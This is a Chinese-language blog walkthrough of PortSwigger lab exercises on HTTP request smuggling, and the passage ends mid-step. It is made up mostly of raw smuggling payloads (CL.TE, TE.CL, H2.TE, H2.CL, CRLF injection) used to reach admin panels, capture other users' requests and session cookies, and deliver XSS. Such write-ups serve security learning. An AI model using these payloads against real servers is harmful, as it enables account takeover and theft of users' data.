+<h2 id="6-利用-HTTP-请求走私绕过前端安全控制，CL-TE-漏洞"><a href="#6-利用-HTTP-请求走私绕过前端安全控制，CL-TE-漏洞" class="headerlink" title="6.利用 HTTP 请求走私绕过前端安全控制，CL.TE 漏洞"></a>6.利用 HTTP 请求走私绕过前端安全控制，CL.TE 漏洞</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312143702597.png" alt="image-20230312143702597"></p>
+<p>前端不转发&#x2F;admin的请求，并且看到前端不支持分块编码，我们利用CL.TE走私进行攻击</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: ID</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 37</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<p>前端接受这个请求，发给后端，后端把它分成两个，第一个正常请求，第二个因为缺少标头，会继续接收，我们再发送第二次，后端会补全标头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-Ignore: XPOST / HTTP/1.1</span><br><span class="line">Host: ID</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 37</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312150058762.png" alt="image-20230312150058762"></p>
+<p>发送之后，显示需要本地用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0af200bd03e047e7c0ed226d0080001b.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 54</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">X-Ignore: X</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312150222643.png" alt="image-20230312150222643"></p>
+<p>观察到由于第二个请求的 Host 标头与第一个请求中走私的 Host 标头冲突，请求被阻止</p>
+<p>我们修改GET，让它只从第二次请求取一定长度</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0af200bd03e047e7c0ed226d0080001b.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 116</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p>这样</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0af200bd03e047e7c0ed226d0080001b.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 116</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">x=P</span><br></pre></td></tr></table></figure>
+
+<p>把之后的请求都给破坏掉，让这个请求成功</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312151636947.png" alt="image-20230312151636947"></p>
+<p>根据返回的href，我们删除用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0af200bd03e047e7c0ed226d0080001b.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 138</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 3</span><br><span class="line"></span><br><span class="line">x=</span><br></pre></td></tr></table></figure>
+
+<p>发送两次，出现这样就成功了</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312151841228.png" alt="image-20230312151841228"></p>
+<h2 id="7-利用-HTTP-请求走私绕过前端安全控制，TE-CL-漏洞"><a href="#7-利用-HTTP-请求走私绕过前端安全控制，TE-CL-漏洞" class="headerlink" title="7.利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞"></a>7.利用 HTTP 请求走私绕过前端安全控制，TE.CL 漏洞</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312152052038.png" alt="image-20230312152052038"></p>
+<p>和上一题相反</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a240012045d273ac0bb598200b400e2.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">60</span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312153406712.png" alt="image-20230312153406712"></p>
+<p>仅允许本地，我们在修改Host的同时修改CL</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a240012045d273ac0bb598200b400e2.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">73</span><br><span class="line">POST /admin HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发送两次</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312153726273.png" alt="image-20230312153726273"></p>
+<p>修改请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a240012045d273ac0bb598200b400e2.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">8a</span><br><span class="line">POST /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 15</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">x=1</span><br><span class="line">0</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发送两次，出现这样就成功了</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312153838042.png" alt="image-20230312153838042"></p>
+<h2 id="8-利用-HTTP-请求走私来揭示前端请求重写"><a href="#8-利用-HTTP-请求走私来揭示前端请求重写" class="headerlink" title="8.利用 HTTP 请求走私来揭示前端请求重写"></a>8.利用 HTTP 请求走私来揭示前端请求重写</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312182538376.png" alt="image-20230312182538376"></p>
+<p>有时候为了防止http请求走私攻击，会在前端添加标头</p>
+<p>我们想要访问&#x2F;admin页面，需要在请求中添加特殊标头</p>
+<p>也就是前端会处理收到的请求，在请求中添加新的标头，然后再发给后端，这样没有特定标头的http请求就不会被后端接受了</p>
+<p>我们可以通过让源代码中回显前端添加的标头来判断前端重写的方式</p>
+<p>我们随便搜索一下，查看源代码</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312185653083.png" alt="image-20230312185653083"></p>
+<p>发现我们搜的内容回显到源代码中</p>
+<p>我们抓包，利用这一点进行攻击</p>
+<p>既然他会显示‘123’，那么我们就想办法让这个search搜索的是我们发送的包，且经过前段处理的头</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 124</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST / HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 200</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">search=test</span><br></pre></td></tr></table></figure>
+
+<p>前端把请求处理后传到后端，这时候到达后端的是经过处理的请求，虽然被处理了，但我们访问的是<code>/</code>，不是<code>/admin</code>，所以是可以进行请求走私的</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312191818367.png" alt="image-20230312191818367"></p>
+<p>发现前端添加的标头是<code>X-RFEKyk-Ip: </code>，然后我们在访问<code>/admin</code>页面时，就可以添加这个标头了</p>
+<p>（看了官方解题步骤发现这个标头是随机的）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 143</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin HTTP/1.1</span><br><span class="line">X-RFEKyk-Ip: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312192901008.png" alt="image-20230312192901008"></p>
+<p>我们修改请求删除用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 166</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /admin/delete?username=carlos HTTP/1.1</span><br><span class="line">X-RFEKyk-Ip: 127.0.0.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 10</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<p>出现这样就可以了</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312193124847.png" alt="image-20230312193124847"></p>
+<h2 id="9-利用-HTTP-请求走私来捕获其他用户的请求"><a href="#9-利用-HTTP-请求走私来捕获其他用户的请求" class="headerlink" title="9.利用 HTTP 请求走私来捕获其他用户的请求"></a>9.利用 HTTP 请求走私来捕获其他用户的请求</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312193254800.png" alt="image-20230312193254800"></p>
+<p>我们先抓一下评论的包，在这个数据包中包含了用户大部分信息，我们可以用它来进行攻击</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312194949966.png" alt="image-20230312194949966"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a65001604044c76c16d802a00f600be.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 247</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 400</span><br><span class="line">Cookie: session=w8jFqGJolq7mfI0cSnL4ee12eosEIJLg</span><br><span class="line"></span><br><span class="line">csrf=szQLFyTjijcwjIP6mnO9T0l8hhmdVmtf&amp;postId=10&amp;name=1&amp;email=test1%40test&amp;website=&amp;comment=</span><br></pre></td></tr></table></figure>
+
+<p>这个请求被后端分成</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: 0a65001604044c76c16d802a00f600be.web-security-academy.net</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Length: 247</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">POST /post/comment HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 900</span><br><span class="line">Cookie: session=w8jFqGJolq7mfI0cSnL4ee12eosEIJLg</span><br><span class="line"></span><br><span class="line">csrf=szQLFyTjijcwjIP6mnO9T0l8hhmdVmtf&amp;postId=10&amp;name=1&amp;email=test1%40test&amp;website=&amp;comment=</span><br></pre></td></tr></table></figure>
+
+<p>第二个因为长度原因，会等待，等到收到请求时会把请求添加到后面。这样，我们就相当于在评论界面评论了受害者的请求包</p>
+<p>看一下评论</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230312201706689.png" alt="image-20230312201706689"></p>
+<p>果然，我们使用这个信息登录就可以了</p>
+<h2 id="10-利用-HTTP-请求走私来传递反射-XSS"><a href="#10-利用-HTTP-请求走私来传递反射-XSS" class="headerlink" title="10.利用 HTTP 请求走私来传递反射 XSS"></a>10.利用 HTTP 请求走私来传递反射 XSS</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230313155753196.png" alt="image-20230313155753196"></p>
+<p>题目告诉我们在UA头部进行XSS攻击，所以我们构造这样的payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: </span><br><span class="line">Content_Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 150</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /post?postId=5 HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 5</span><br><span class="line">User-Agent: a&quot;/&gt;&lt;script&gt;alert(1)&lt;/script&gt;</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<p>发送之后就成功了</p>
+<h2 id="11-通过-H2-TE-请求走私的响应队列中毒"><a href="#11-通过-H2-TE-请求走私的响应队列中毒" class="headerlink" title="11.通过 H2.TE 请求走私的响应队列中毒"></a>11.通过 H2.TE 请求走私的响应队列中毒</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230313162226072.png" alt="image-20230313162226072"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">SMUGGLED</span><br></pre></td></tr></table></figure>
+
+<p>发送这个请求之后，会把后面发送过来的请求给污染</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST /x HTTP/2</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /x HTTP/1.1</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>发送这个请求，会返回404，因为不存在文件目录。但是会造成相应队列中毒</p>
+<p>起初，我们发送了这个请求，这个请求会先到前端，前端判断这是一个请求，然后把发送给后端，后端会把这个请求看成两个，这样后端会发送两个响应给前端，但是，前端起初判断只接收了一个请求，所以前端只把后端发过来的两个请求中的第一个返回给我们，剩下的一个还在前端存储着，等到受害者的请求发送给前端时，前端会把存储的第二个响应（我们构造的请求中的第二个）发送给受害者，而受害者的请求的响应在前端存储着，这时，如果我们再发一个请求，前端就会返回给我们受害者的请求的响应，我们就能窃取到受害者的信息了。</p>
+<p>发送第一次会返回404，等待5秒左右再发</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230313191535987.png" alt="image-20230313191535987"></p>
+<p>这既是admin的cookie</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /admin HTTP/2</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Cookie: session=STOLEN-SESSION-COOKIE</span><br></pre></td></tr></table></figure>
+
+<p>发送</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230313191707311.png" alt="image-20230313191707311"></p>
+<p>删除用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">GET /admin/delete?username=carlos HTTP/2</span><br><span class="line">Host: 0af300d904b7d206c0224f1000a300d9.web-security-academy.net</span><br><span class="line">Cookie: session=qEaNrjdcqgj2SIlq7yERg5vYBvBTxE8I</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230313191758921.png" alt="image-20230313191758921"></p>
+<p>这样就成功了</p>
+<h2 id="12-H2-CL请求走私"><a href="#12-H2-CL请求走私" class="headerlink" title="12.H2.CL请求走私"></a>12.H2.CL请求走私</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230313191851507.png" alt="image-20230313191851507"></p>
+<p>我们可以利用重复定向的方式进行攻击，我们现在漏洞利用服务器存储漏洞</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230313194049932.png" alt="image-20230313194049932"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: YOUR-LAB-ID.web-security-academy.net</span><br><span class="line">Content-Length: 0</span><br><span class="line"></span><br><span class="line">GET /resources HTTP/1.1</span><br><span class="line">Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net</span><br><span class="line">Content-Length: 10</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<p>我们在发送这个请求之后，前端把这个发给后端，并给我们但会第一个请求的响应，第二个长度大于文本内容，仍在等待，等受害者访问时会填充，把受害者的请求破坏，导致受害者访问漏洞利用服务器</p>
+<p>自己试一下</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230313200505225.png" alt="image-20230313200505225"></p>
+<p>可以看到是可以的，然后我们就一直攻击就可以了</p>
+<h2 id="13-通过-CRLF-注入的-HTTP-x2F-2-请求走私"><a href="#13-通过-CRLF-注入的-HTTP-x2F-2-请求走私" class="headerlink" title="13.通过 CRLF 注入的 HTTP&#x2F;2 请求走私"></a>13.通过 CRLF 注入的 HTTP&#x2F;2 请求走私</h2><p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314104505570.png" alt="image-20230314104505570"></p>
+<p>CRLF就是回车换行</p>
+<p>我们搜索几次看看</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314110849490.png" alt="image-20230314110849490"></p>
+<p>发现，我们搜索的内容会回显到界面上，这有点类似于我们之前做的通过评论窃取用户信息</p>
+<p>我们尝试一下</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a14008b03745d92c0740b3e000f0057.web-security-academy.net</span><br><span class="line"></span><br><span class="line">GET /x HTTP/1.1</span><br><span class="line">Host: 0a14008b03745d92c0740b3e000f0057.web-security-academy.net</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<p>按理说，我们在POST中应该写入CL标头</p>
+<p>我们在inspector中添加</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314113926356.png" alt="image-20230314113926356"></p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314113953102.png" alt="image-20230314113953102"></p>
+<p>这里要注意的是，不能直接按回车键，直接按回车相当于按了确认键，我们可以用shift+回车键</p>
+<p>发送</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314114547370.png" alt="image-20230314114547370"></p>
+<p>这时候发现CL不是一个，我们试一下TE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">POST / HTTP/2</span><br><span class="line">Host: 0a4800d7041fb384c04b2247009f003a.web-security-academy.net</span><br><span class="line"></span><br><span class="line">0</span><br><span class="line"></span><br><span class="line">GET /x HTTP/1.1</span><br><span class="line">Host: 0a4800d7041fb384c04b2247009f003a.web-security-academy.net</span><br><span class="line">Content-Length: 5</span><br><span class="line"></span><br><span class="line">x=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314120343144.png" alt="image-20230314120343144"></p>
+<p>可以看到正常回显了</p>
+<p>我们在发送了这个请求之后在发送一个正常的请求，应该是404</p>
+<p><img src="https://skyserver-1316983678.cos.ap-beijing.myqcloud.com/img/image-20230314120741352.png" alt="image-20230314120741352"></p>
+<p>果然，接下来我们就继续间隔性的进行攻击就可以了</p>
+<p>我们先构造这样的请求</p>
